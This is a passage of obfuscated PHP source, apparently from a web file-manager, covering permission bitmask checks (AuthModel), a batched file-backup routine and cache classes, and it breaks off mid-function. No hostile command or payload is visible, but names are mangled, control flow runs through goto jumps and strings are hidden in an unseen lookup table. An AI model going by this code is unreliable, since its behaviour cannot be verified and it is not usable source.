{ goto f´±¦§ŠÄ; aÌôìŸØ´å: $aÆÊá±í‡á = $this->sourceSize(); $fÛ‰Æ†ä– = array($A“¯êœÂ¹à[472] => 0, $A“¯êœÂ¹à[398] => 1); $cøîŸ‹é = Model($A“¯êœÂ¹à[796])->where($fÛ‰Æ†ä–)->sum($A“¯êœÂ¹à[77]); goto A–ÓˆÄàŞ†; f´±¦§ŠÄ: $A“¯êœÂ¹à =& $_SERVER[…ë˜õ]; if (isset($e©„šğ„Í[$A“¯êœÂ¹à[1531]])) { return Model($A“¯êœÂ¹à[796])->userFileTypeProfile($e©„šğ„Í[$A“¯êœÂ¹à[1531]]); } if (isset($e©„šğ„Í[$A“¯êœÂ¹à[1694]])) { return Model($A“¯êœÂ¹à[796])->groupFileTypeProfile($e©„šğ„Í[$A“¯êœÂ¹à[1694]]); } goto aÌôìŸØ´å; A–ÓˆÄàŞ†: $fÛ‰Æ†ä–[$A“¯êœÂ¹à[398]] = 2; $BçåÏ²„ß¿ = Model($A“¯êœÂ¹à[796])->where($fÛ‰Æ†ä–)->sum($A“¯êœÂ¹à[77]); return array($A“¯êœÂ¹à[740] => $aÆÊá±í‡á[$A“¯êœÂ¹à[77]], $A“¯êœÂ¹à[1625] => $aÆÊá±í‡á[$A“¯êœÂ¹à[1625]], $A“¯êœÂ¹à[1626] => (int) $cøîŸ‹é, $A“¯êœÂ¹à[1627] => (int) $BçåÏ²„ß¿); goto EÄÌÃ‘¾Ï®; EÄÌÃ‘¾Ï®: } private function sourceSize() { $F¤¥ß»‚ÖĞ =& $_SERVER[…ë˜õ]; $Bøî÷«ÊÙ½ = Model($F¤¥ß»‚ÖĞ[796])->where(array($F¤¥ß»‚ÖĞ[397] => 0))->sum($F¤¥ß»‚ÖĞ[77]); $b·–”ŸÒÍ = Model($F¤¥ß»‚ÖĞ[444])->sum($F¤¥ß»‚ÖĞ[77]); if ($b·–”ŸÒÍ > $Bøî÷«ÊÙ½) { $b·–”ŸÒÍ = $Bøî÷«ÊÙ½; } return array($F¤¥ß»‚ÖĞ[77] => (int) $Bøî÷«ÊÙ½, $F¤¥ß»‚ÖĞ[1625] => (int) $b·–”ŸÒÍ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $f”¨–®³ã =& $_SERVER[…ë˜õ]; $D«ù¿íÍ‚¶ = array(array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1695]), $f”¨–®³ã[1696] => $f”¨–®³ã[1697], $f”¨–®³ã[1698] => 1, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1701]), $f”¨–®³ã[1696] => $f”¨–®³ã[1702], $f”¨–®³ã[1698] => 2, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1703]), $f”¨–®³ã[1696] => $f”¨–®³ã[1704], $f”¨–®³ã[1698] => 3, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1705]), $f”¨–®³ã[1696] => $f”¨–®³ã[1706], $f”¨–®³ã[1698] => 4, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_VIEW), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1707]), $f”¨–®³ã[1696] => $f”¨–®³ã[1708], $f”¨–®³ã[1698] => 5, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1709]), $f”¨–®³ã[1696] => $f”¨–®³ã[1710], $f”¨–®³ã[1698] => 6, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($f”¨–®³ã[407] => LNG($f”¨–®³ã[1711]), $f”¨–®³ã[1696] => $f”¨–®³ã[1712], $f”¨–®³ã[1698] => 7, $f”¨–®³ã[1699] => 1, $f”¨–®³ã[1700] => 0)); return $D«ù¿íÍ‚¶; } public static function authCheck($aŒÀ÷Ÿ«Œè, $cÃ‰ŸÌ‹æ) { $aŒÀ÷Ÿ«Œè = intval($aŒÀ÷Ÿ«Œè); if ($GLOBALS[$_SERVER[…ë˜õ][479]]) { return !0; } if ($aŒÀ÷Ÿ«Œè <= 0) { return !1; } if (($aŒÀ÷Ÿ«Œè & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aŒÀ÷Ÿ«Œè & $cÃ‰ŸÌ‹æ); } public static function authCheckShow($d¿Äª“­Ÿ) { return self::authCheck($d¿Äª“­Ÿ, self::AUTH_SHOW); } public static function authCheckView($fÄµ©ô¬¥¨) { return self::authCheck($fÄµ©ô¬¥¨, self::AUTH_VIEW); } public static function authCheckDownload($eÄ‘‘ÓÈñ´) { return self::authCheck($eÄ‘‘ÓÈñ´, self::AUTH_DOWNLOAD); } public static function authCheckUpload($DöÒˆà²Ï) { return self::authCheck($DöÒˆà²Ï, self::AUTH_UPLOAD); } public static function authCheckEdit($A›Ú° §¢Í) { return self::authCheck($A›Ú° §¢Í, self::AUTH_EDIT); } public static function authCheckRemove($aâ£Î ª‹ä) { return self::authCheck($aâ£Î ª‹ä, self::AUTH_REMOVE); } public static function authCheckShare($FÀÎ‘‰”ç) { return self::authCheck($FÀÎ‘‰”ç, self::AUTH_SHARE); } public static function authCheckComment($C…¬˜²õöï) { return self::authCheck($C…¬˜²õöï, self::AUTH_COMMENT); } public static function authCheckEvent($eÁÑù›Ù¹¥) { return self::authCheck($eÁÑù›Ù¹¥, self::AUTH_EVENT); } public static function authCheckRoot($F³ÎÊ‡Å÷) { return self::authCheck($F³ÎÊ‡Å÷, self::AUTH_ROOT); } public static function authCheckAction($fµ¬¡òôà³, $fÂ…òãê¾¡) { goto dâ‡ñŸíØì; dŒòŒÛÊ‹ä: if (($fµ¬¡òôà³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fµ¬¡òôà³ & $EçêãÍñ); goto Dñ¼·±ò¯; dâ‡ñŸíØì: $b÷«§ïÓ¿÷ =& $_SERVER[…ë˜õ]; $D‰ŠĞ°‹¦ = array($b÷«§ïÓ¿÷[1713] => self::AUTH_VIEW, $b÷«§ïÓ¿÷[1099] => self::AUTH_DOWNLOAD, $b÷«§ïÓ¿÷[106] => self::AUTH_UPLOAD, $b÷«§ïÓ¿÷[1661] => self::AUTH_EDIT, $b÷«§ïÓ¿÷[1660] => self::AUTH_REMOVE, $b÷«§ïÓ¿÷[1671] => self::AUTH_SHARE, $b÷«§ïÓ¿÷[350] => self::AUTH_COMMENT, $b÷«§ïÓ¿÷[1519] => self::AUTH_EVENT, $b÷«§ïÓ¿÷[1714] => self::AUTH_ROOT); if (!isset($D‰ŠĞ°‹¦[$fÂ…òãê¾¡])) { return; } goto D¡‰·ÖèÏï; D¡‰·ÖèÏï: $EçêãÍñ = $D‰ŠĞ°‹¦[$fÂ…òãê¾¡]; $fµ¬¡òôà³ = intval($fµ¬¡òôà³); if ($fµ¬¡òôà³ <= 0) { return !1; } goto dŒòŒÛÊ‹ä; Dñ¼·±ò¯: } public static function authDisable($dö¼ÅØ ª›, $bÖ˜¦ÔŠ¸) { if (intval($dö¼ÅØ ª›) <= 0) { return 0; } return intval($dö¼ÅØ ª›) & ~$bÖ˜¦ÔŠ¸; } public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x73\157\165\x72\x63\145\101\x75\164\x68\114\151\163\164"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\154\141\142\x65\x6c", "\144\151\x73\x70\154\141\x79", "\x73\171\163\164\x65\155", "\163\x6f\x72\x74"); public function initData() { $eà““ÃÍÕ = $this->authDefault(); foreach ($eà““ÃÍÕ as $Fä…•¬»ê‡) { $this->add($Fä…•¬»ê‡); } } public function listData($EƒáÃ±ë’¼ = false, $BøİñÈ…° = "\163\157\x72\x74", $DÆ²öŒ½í› = false) { return parent::listData($EƒáÃ±ë’¼, $BøİñÈ…°, $DÆ²öŒ½í›); } public function update($f’Ä»…‡º, $BˆÊÎÉà) { $Dí©Ïé”¿ =& $_SERVER[…ë˜õ]; $C÷Ñ£Ş“Àâ = parent::listData($f’Ä»…‡º); $f¨Íöà¨›ô = $this->findByName($BˆÊÎÉà[$Dí©Ïé”¿[28]]); if (!$C÷Ñ£Ş“Àâ || $f¨Íöà¨›ô && $f¨Íöà¨›ô[$Dí©Ïé”¿[388]] != $C÷Ñ£Ş“Àâ[$Dí©Ïé”¿[388]]) { return !1; } $this->filterAuth($BˆÊÎÉà[$Dí©Ïé”¿[400]]); return parent::update($f’Ä»…‡º, $BˆÊÎÉà); } public function remove($d„ºíºö ) { $Fé…¡ÑÓØ¨ = parent::listData($d„ºíºö ); if (!$Fé…¡ÑÓØ¨ || $Fé…¡ÑÓØ¨[$_SERVER[…ë˜õ][1174]]) { return !1; } return parent::remove($d„ºíºö ); } public function add($dà®ÃÖŠÓ‡ = array()) { goto CÌù­¥»§»; CÌù­¥»§»: $cÈº³‹©é‡ =& $_SERVER[…ë˜õ]; if ($this->findByName($dà®ÃÖŠÓ‡[$cÈº³‹©é‡[28]])) { return !1; } $c•º†àÖ° = array($cÈº³‹©é‡[28] => $cÈº³‹©é‡[33], $cÈº³‹©é‡[400] => 1, $cÈº³‹©é‡[1715] => $cÈº³‹©é‡[1704], $cÈº³‹©é‡[1716] => 1, $cÈº³‹©é‡[1174] => 0, $cÈº³‹©é‡[1717] => 0); goto Bá¥„¥«¯Ä; Bá¥„¥«¯Ä: $dà®ÃÖŠÓ‡ = array_merge($c•º†àÖ°, $dà®ÃÖŠÓ‡); $dà®ÃÖŠÓ‡[$cÈº³‹©é‡[1717]] = $this->getSort(); $this->filterAuth($dà®ÃÖŠÓ‡[$cÈº³‹©é‡[400]]); goto dÉì±Ü“‡æ; dÉì±Ü“‡æ: return parent::insert($dà®ÃÖŠÓ‡); goto fÛ¨£ÖÔÎ—; fÛ¨£ÖÔÎ—: } private function getSort() { $BÓÙÕÏø˜ =& $_SERVER[…ë˜õ]; $fö·“¤æ‚ = parent::listData(); $A•éŞ½„¦• = array_to_keyvalue($fö·“¤æ‚, $BÓÙÕÏø˜[33], $BÓÙÕÏø˜[1717]); return empty($A•éŞ½„¦•) ? 0 : max($A•éŞ½„¦•) + 1; } private function filterAuth(&$aàÙÌ³ø¶Œ) { goto F³ö¾Ø¼¸¦; E‹±ÏÊ—¼Ë: foreach ($f§ñ„‰¾É as $AôìÆß‡À®) { if ($aàÙÌ³ø¶Œ & $AôìÆß‡À®) { $aéì»—º’[] = $AôìÆß‡À®; } } if (in_array(self::AUTH_ROOT, $aéì»—º’)) { $aàÙÌ³ø¶Œ = array_sum($f§ñ„‰¾É); return; } $aó²·¹Ù˜ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto AãéÇ‹‚‚Á; AãéÇ‹‚‚Á: foreach ($aéì»—º’ as $AôìÆß‡À®) { if (isset($aó²·¹Ù˜[$AôìÆß‡À®])) { $aéì»—º’ = array_merge($aéì»—º’, $aó²·¹Ù˜[$AôìÆß‡À®]); } } $aéì»—º’[] = self::AUTH_SHOW; $aàÙÌ³ø¶Œ = array_sum(array_unique($aéì»—º’)); goto A¤¸ØÕ°£; F³ö¾Ø¼¸¦: if (!$aàÙÌ³ø¶Œ) { return; } $f§ñ„‰¾É = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $aéì»—º’ = array(); goto E‹±ÏÊ—¼Ë; A¤¸ØÕ°£: } public function sort($B¦èåœ½«±, $FÆ¢äÒÚ´Å) { return parent::update($B¦èåœ½«±, $FÆ¢äÒÚ´Å); } } goto B´Ï‚÷â³î; d‰½‡¿‚ƒÜ: class BackupFile { public function __construct() { } public function index() { goto BÛî‹‹åâ; BˆíŒßìÖö: $c©«æ¾®×Ü = $a¶§À³ÔÎÉ = 0; do { $b÷‡´¾×Ê = $_SERVER[…ë˜õ][786]; $A·¥ŒõÚ = Model($_SERVER[…ë˜õ][760])->where($dİœÒÛ“)->field($b÷‡´¾×Ê)->order($_SERVER[…ë˜õ][787])->selectPage($F Ñã°Ö¬, $fÕ„ÕĞÜæ®); $AÆÓ‘ªä‡Ë = !empty($A·¥ŒõÚ[$_SERVER[…ë˜õ][365]]) ? $A·¥ŒõÚ[$_SERVER[…ë˜õ][365]] : array(); foreach ($AÆÓ‘ªä‡Ë as $DéšÀ‚Â¯) { goto d´§³ˆŸÔ; BÙŒ´óƒ½µ: if ($cé½Òğ„Šƒ >= 1024 * 1024 * 100) { $CÌ¢™ÒÄÑ´ = array($_SERVER[…ë˜õ][792] => $AÏ œóæàµ, $_SERVER[…ë˜õ][793] => $a¶§À³ÔÎÉ, $_SERVER[…ë˜õ][794] => $c©«æ¾®×Ü); Backup::set($CÌ¢™ÒÄÑ´); $cé½Òğ„Šƒ = $FÒ…Á‘³õò = 0; } goto a§Şåœø‚Ë; d´§³ˆŸÔ: if (!$this->_fileExist($DéšÀ‚Â¯, $Dñ„³ìĞÒÚ, $cÜ¦ğ²»³à)) { $E««È­ÒÜ -= 1; $a°Ó¯İøî¸ -= (int) $DéšÀ‚Â¯[$_SERVER[…ë˜õ][77]]; write_log("\x66\151\x6c\x65\x20\156\157\x74\x20\x65\x78\151\x73\x74\56\x66\x69\x6c\145\x49\x44\72{$DéšÀ‚Â¯[$_SERVER[…ë˜õ][441]]}\x2c\40\x70\x61\x74\x68\72{$DéšÀ‚Â¯[$_SERVER[…ë˜õ][75]]}", $_SERVER[…ë˜õ][788]); continue; } $cØ˜Ì™Ğ ğ = $DéšÀ‚Â¯[$_SERVER[…ë˜õ][75]]; $f´ä÷‡çô› = "\x7b\x69\x6f\72{$F±‘İÃÖìâ[$_SERVER[…ë˜õ][733]]}\x7d" . substr($cØ˜Ì™Ğ ğ, strlen("\173\151\157\x3a{$DéšÀ‚Â¯[$_SERVER[…ë˜õ][789]]}\175")); goto D»‡§¬ù; D“•Ù‹óì‡: $cé½Òğ„Šƒ += $DéšÀ‚Â¯[$_SERVER[…ë˜õ][77]]; $a¶§À³ÔÎÉ += 1; $c©«æ¾®×Ü += $DéšÀ‚Â¯[$_SERVER[…ë˜õ][77]]; goto BÙŒ´óƒ½µ; D»‡§¬ù: if (IO::exist($f´ä÷‡çô›)) { $a™×‹’Ú»->updateFileEnd($DéšÀ‚Â¯[$_SERVER[…ë˜õ][28]], $DéšÀ‚Â¯[$_SERVER[…ë˜õ][77]]); } else { $f´ä÷‡çô› = get_path_father($f´ä÷‡çô›); IO::mkdir($f´ä÷‡çô›); if (!IO::copy($cØ˜Ì™Ğ ğ, $f´ä÷‡çô›, $_SERVER[…ë˜õ][790])) { write_log($_SERVER[…ë˜õ][791] . $cØ˜Ì™Ğ ğ . $_SERVER[…ë˜õ][776] . $f´ä÷‡çô› . $_SERVER[…ë˜õ][499], $_SERVER[…ë˜õ][755]); $fğÌå¥¹¹” = !1; break; } } $AÏ œóæàµ = $DéšÀ‚Â¯[$_SERVER[…ë˜õ][441]]; $FÒ…Á‘³õò += 1; goto D“•Ù‹óì‡; a§Şåœø‚Ë: } $C ÆÁ”‚ƒ‹ = count($AÆÓ‘ªä‡Ë); $fÕ„ÕĞÜæ®++; } while ($C ÆÁ”‚ƒ‹ == $F Ñã°Ö¬); $a™×‹’Ú»->end(); goto EŠ†Îİ¼ò; aå“˜÷ì„: $F Ñã°Ö¬ = 1000; $cé½Òğ„Šƒ = $FÒ…Á‘³õò = 0; $Dñ„³ìĞÒÚ = array(); goto BˆíŒßìÖö; aÈåÇ›îĞÊ: $this->_fileFilter($Dñ„³ìĞÒÚ); return !0; goto Fæ—“ñÅŠ; C®Ë‚–¬Üã: $a™×‹’Ú»->task[$_SERVER[…ë˜õ][740]] = $a°Ó¯İøî¸; $CÌ¢™ÒÄÑ´ = array($_SERVER[…ë˜õ][784] => $E««È­ÒÜ, $_SERVER[…ë˜õ][785] => $a°Ó¯İøî¸); Backup::set($CÌ¢™ÒÄÑ´); goto FâÄ¾¢„É’; FâÄ¾¢„É’: $fğÌå¥¹¹” = !0; $cÜ¦ğ²»³à = $this->storeIds(); $fÕ„ÕĞÜæ® = 1; goto aå“˜÷ì„; BÛî‹‹åâ: $F±‘İÃÖìâ = Backup::get(); $AÏ œóæàµ = $F±‘İÃÖìâ[$_SERVER[…ë˜õ][289]][$_SERVER[…ë˜õ][191]][$_SERVER[…ë˜õ][441]]; $dİœÒÛ“ = array($_SERVER[…ë˜õ][442] => array($_SERVER[…ë˜õ][780], $AÏ œóæàµ), $_SERVER[…ë˜õ][781] => array($_SERVER[…ë˜õ][327], $F±‘İÃÖìâ[$_SERVER[…ë˜õ][733]])); goto cÛâ”…ÈÇ; cÛâ”…ÈÇ: $E««È­ÒÜ = (int) Model($_SERVER[…ë˜õ][760])->where($dİœÒÛ“)->count($_SERVER[…ë˜õ][441]); $a°Ó¯İøî¸ = (int) Model($_SERVER[…ë˜õ][760])->where($dİœÒÛ“)->sum($_SERVER[…ë˜õ][77]); $a™×‹’Ú» = new TaskFileTransfer($_SERVER[…ë˜õ][782], $_SERVER[…ë˜õ][755], $E««È­ÒÜ, LNG($_SERVER[…ë˜õ][756]) . $_SERVER[…ë˜õ][757] . LNG($_SERVER[…ë˜õ][783])); goto C®Ë‚–¬Üã; EŠ†Îİ¼ò: $CÌ¢™ÒÄÑ´ = array($_SERVER[…ë˜õ][795] => 1, $_SERVER[…ë˜õ][470] => time(), $_SERVER[…ë˜õ][750] => 1, $_SERVER[…ë˜õ][792] => $AÏ œóæàµ, $_SERVER[…ë˜õ][785] => $a°Ó¯İøî¸, $_SERVER[…ë˜õ][784] => $E««È­ÒÜ); if ($FÒ…Á‘³õò) { $CÌ¢™ÒÄÑ´[$_SERVER[…ë˜õ][793]] = $a¶§À³ÔÎÉ; $CÌ¢™ÒÄÑ´[$_SERVER[…ë˜õ][794]] = $c©«æ¾®×Ü; } Backup::set($CÌ¢™ÒÄÑ´); goto aÈåÇ›îĞÊ; Fæ—“ñÅŠ: } private function _fileExist($eëö¢ÙÆ«, &$DÎŠøí¢ƒ, $aáÃõïÂ®Ä) { goto D®Âê¨µ¦Î; cäî¯Ø«È: if (IO::exist($EòÛÊ«ÒÛ)) { $DÎŠøí¢ƒ[] = $eëö¢ÙÆ«[$b‘Î±ó’Ó[441]]; return !1; } $e†™Åª×‰¡ = array($b‘Î±ó’Ó[789] => $eëö¢ÙÆ«[$b‘Î±ó’Ó[789]], $b‘Î±ó’Ó[75] => array($b‘Î±ó’Ó[378], "{$EòÛÊ«ÒÛ}\x25")); $dÎ¥ô«ÕÃ = Model($b‘Î±ó’Ó[760])->where($e†™Åª×‰¡)->field($b‘Î±ó’Ó[442])->select(); goto BÙòĞ›‰Ôî; DíÂ›ßÈøµ: if (!in_array($eëö¢ÙÆ«[$b‘Î±ó’Ó[789]], $aáÃõïÂ®Ä)) { return !1; } if (IO::exist($Aàà¶æÍÛ‘)) { return !0; } $EòÛÊ«ÒÛ = get_path_father($Aàà¶æÍÛ‘); goto cäî¯Ø«È; D®Âê¨µ¦Î: $b‘Î±ó’Ó =& $_SERVER[…ë˜õ]; $Aàà¶æÍÛ‘ = $eëö¢ÙÆ«[$b‘Î±ó’Ó[75]]; if (in_array($eëö¢ÙÆ«[$b‘Î±ó’Ó[441]], $DÎŠøí¢ƒ)) { return !1; } goto DíÂ›ßÈøµ; BÙòĞ›‰Ôî: $DÎŠøí¢ƒ = array_merge($DÎŠøí¢ƒ, array_to_keyvalue($dÎ¥ô«ÕÃ, $b‘Î±ó’Ó[33], $b‘Î±ó’Ó[441])); return !1; goto aøœÏ´ŒÏÄ; aøœÏ´ŒÏÄ: } private function _fileFilter($E›ôÃ¦â¯¤) { $aŒ’Æõ™‚Ø =& $_SERVER[…ë˜õ]; if (empty($E›ôÃ¦â¯¤)) { return; } $A—ßå×Ï¹ = array($aŒ’Æõ™‚Ø[441] => array($aŒ’Æõ™‚Ø[7], array_unique($E›ôÃ¦â¯¤))); $a‘Û­…¨© = Model($aŒ’Æõ™‚Ø[796])->where($A—ßå×Ï¹)->field($aŒ’Æõ™‚Ø[390])->select(); foreach ($a‘Û­…¨© as $dÌìÊŠãÏ¸) { Model($aŒ’Æõ™‚Ø[796])->remove($dÌìÊŠãÏ¸[$aŒ’Æõ™‚Ø[390]], !1); } } private function storeIds() { $Bæ„½‡·’ =& $_SERVER[…ë˜õ]; $E’’Ü´´î = Model($Bæ„½‡·’[745])->listData(); $fÓ†‰‹õÅã = array(); $Fî„šÚÒô = $GLOBALS[$Bæ„½‡·’[6]][$Bæ„½‡·’[87]][$Bæ„½‡·’[797]]; foreach ($E’’Ü´´î as $aÏ±Ğî¢Ê) { $eÎóòšˆ“ì = strtolower($aÏ±Ğî¢Ê[$Bæ„½‡·’[93]]); if (!isset($Fî„šÚÒô[$eÎóòšˆ“ì])) { continue; } $eá†­¿§â = $Bæ„½‡·’[71] . (isset($Fî„šÚÒô[$eÎóòšˆ“ì]) ? $Fî„šÚÒô[$eÎóòšˆ“ì] : ucfirst($eÎóòšˆ“ì)); if (!class_exists($eá†­¿§â)) { continue; } $fÓ†‰‹õÅã[] = $aÏ±Ğî¢Ê[$Bæ„½‡·’[388]]; } return $fÓ†‰‹õÅã; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Fé¸²ä–¬¾; bÃîÙÕŸİ«: $eÑÑéíæÙ = $GLOBALS[$b°¥åŸõôò[6]][$b°¥åŸõôò[345]]; $A¯ÇÅ³¾Ú = $eÑÑéíæÙ[$eÑÑéíæÙ[$b°¥åŸõôò[798]]]; $FçŠÛ¡¥Òñ = $eÑÑéíæÙ[$b°¥åŸõôò[799]]; goto F¼‰Ç¸‡ÀØ; F¼‰Ç¸‡ÀØ: switch ($eÑÑéíæÙ[$b°¥åŸõôò[798]]) { case $b°¥åŸõôò[17]: self::$handle = Model($b°¥åŸõôò[800]); break; case $b°¥åŸõôò[801]: self::$handle = new CacheRedis($A¯ÇÅ³¾Ú, $FçŠÛ¡¥Òñ); break; case $b°¥åŸõôò[802]: self::$handle = new CacheMemcached($A¯ÇÅ³¾Ú, $FçŠÛ¡¥Òñ); break; case $b°¥åŸõôò[191]: self::$handle = new CacheFile($A¯ÇÅ³¾Ú, $FçŠÛ¡¥Òñ); break; default: break; } return self::$handle; goto F©‹àÆœˆ‹; Fé¸²ä–¬¾: $b°¥åŸõôò =& $_SERVER[…ë˜õ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto bÃîÙÕŸİ«; F©‹àÆœˆ‹: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($AìÈ„ÈœÇ) { if (is_array($AìÈ„ÈœÇ) || is_object($AìÈ„ÈœÇ)) { $AìÈ„ÈœÇ = json_encode($AìÈ„ÈœÇ); } $AìÈ„ÈœÇ = rawurlencode($AìÈ„ÈœÇ); return md5(KOD_SITE_ID . $_SERVER[…ë˜õ][70] . $AìÈ„ÈœÇ); } public static function get($b—Ø•‰½‘Ñ, $AÑ½äªĞ“‡ = false) { $f‹¶…Çì› = self::key($b—Ø•‰½‘Ñ); if ($AÑ½äªĞ“‡) { return unserialize(self::init()->get($f‹¶…Çì›)); } if (!isset(self::$memoryCache[$f‹¶…Çì›])) { $Aƒ÷÷Èæ•´ = self::init()->get($f‹¶…Çì›); self::$memoryCache[$f‹¶…Çì›] = unserialize($Aƒ÷÷Èæ•´); } return self::$memoryCache[$f‹¶…Çì›]; } public static function set($f°‰öÔ•Õ¿, $bâ¢ˆ©–, $FÏËÄ°©™œ = false) { goto dÅÌëÆ÷ì; eªí·ë°¿¥: CacheLock::unlock($f°‰öÔ•Õ¿); return $a¿² Á„¨…; goto D»Ğ×›ÇÈ; dÅÌëÆ÷ì: $Aˆ‘á³¶˜Û = self::key($f°‰öÔ•Õ¿); if (isset(self::$memoryCache[$Aˆ‘á³¶˜Û]) && self::$memoryCache[$Aˆ‘á³¶˜Û] === $bâ¢ˆ©–) { return !0; } if ($FÏËÄ°©™œ === 0) { self::$memoryCache[$Aˆ‘á³¶˜Û] = $bâ¢ˆ©–; return !0; } goto CÉĞ½íÑÓ¦; CÉĞ½íÑÓ¦: CacheLock::lock($f°‰öÔ•Õ¿); $a¿² Á„¨… = self::init()->set($Aˆ‘á³¶˜Û, serialize($bâ¢ˆ©–), $FÏËÄ°©™œ); self::$memoryCache[$Aˆ‘á³¶˜Û] = $bâ¢ˆ©–; goto eªí·ë°¿¥; D»Ğ×›ÇÈ: } public static function getCall($Fä¯ë°Ş¬·, $BïÓË‘ôË¦, $dßµ†ÕÑïÓ, $b ›Õ…Ûˆ = array()) { $E†»ÆÌ‚æË = self::get($Fä¯ë°Ş¬·); if ($E†»ÆÌ‚æË) { return $E†»ÆÌ‚æË; } $E†»ÆÌ‚æË = call_user_func_array($dßµ†ÕÑïÓ, $b ›Õ…Ûˆ); self::set($Fä¯ë°Ş¬·, $E†»ÆÌ‚æË, $BïÓË‘ôË¦); return $E†»ÆÌ‚æË; } public static function remove($D½ßËØŒÑù) { goto EÔÙÈóİ¹ä; b˜ƒ¨„¼Ú: return $eÂ··ÎàñÀ; goto c„Œ†„‘ŞÌ; EÔÙÈóİ¹ä: $A¿˜ Ê‰îğ = self::key($D½ßËØŒÑù); unset(self::$memoryCache[$A¿˜ Ê‰îğ]); self::clearTimeout(); goto c×ÌƒŠ²Ñ; c×ÌƒŠ²Ñ: CacheLock::lock($D½ßËØŒÑù); $eÂ··ÎàñÀ = self::init()->remove($A¿˜ Ê‰îğ); CacheLock::unlock($D½ßËØŒÑù); goto b˜ƒ¨„¼Ú; c„Œ†„‘ŞÌ: } public static function removeMemory($a‹™‘³‹•ì) { $féçˆÀ»£Œ = self::key($a‹™‘³‹•ì); unset(self::$memoryCache[$féçˆÀ»£Œ]); } public static function clearMemory($EŠÃ˜Ï²Ê = false) { if ($EŠÃ˜Ï²Ê) { $EŠÃ˜Ï²Ê = self::key($EŠÃ˜Ï²Ê); unset(self::$memoryCache[$EŠÃ˜Ï²Ê]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[…ë˜õ][803])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[…ë˜õ][804])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($dĞğÏêñÅ°, $f’Ï©Ø¾—) { $C½’ß„²ë“ =& $_SERVER[…ë˜õ]; $this->cachePath = $dĞğÏêñÅ°[$C½’ß„²ë“[75]]; $this->prefix = $C½’ß„²ë“[805]; $this->cacheTime = $f’Ï©Ø¾—; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bâì¨°¨Ë) { $D”ñ†Ø„ =& $_SERVER[…ë˜õ]; $bâì¨°¨Ë = str_replace(array($D”ñ†Ø„[806], $D”ñ†Ø„[96], $D”ñ†Ø„[69]), $D”ñ†Ø„[807], $bâì¨°¨Ë); return $this->cachePath . $D”ñ†Ø„[808] . $bâì¨°¨Ë . $D”ñ†Ø„[809]; } public function set($e‡¼†Æœî‰, $bŸ©âÏå›æ, $bîÃˆ‘©Ê¦ = false) { $CÔ‡…éÎ  = $this->getFile($e‡¼†Æœî‰); if (file_put_contents($CÔ‡…éÎ , $this->prefix . $bŸ©âÏå›æ, LOCK_EX)) { return !0; } @unlink($CÔ‡…éÎ ); return !1; } public function get($fŸæöÈÒ¦¡) { $eÓŞ…ºÜë = $this->getFile($fŸæöÈÒ¦¡); if (file_exists($eÓŞ…ºÜë) && filemtime($eÓŞ…ºÜë) < time() - $this->cacheTime) { @unlink($eÓŞ…ºÜë); return !1; } $cõïÈÀâŒ‘ = @file_get_contents($eÓŞ…ºÜë); return substr($cõïÈÀâŒ‘, strlen($this->prefix)); } public function 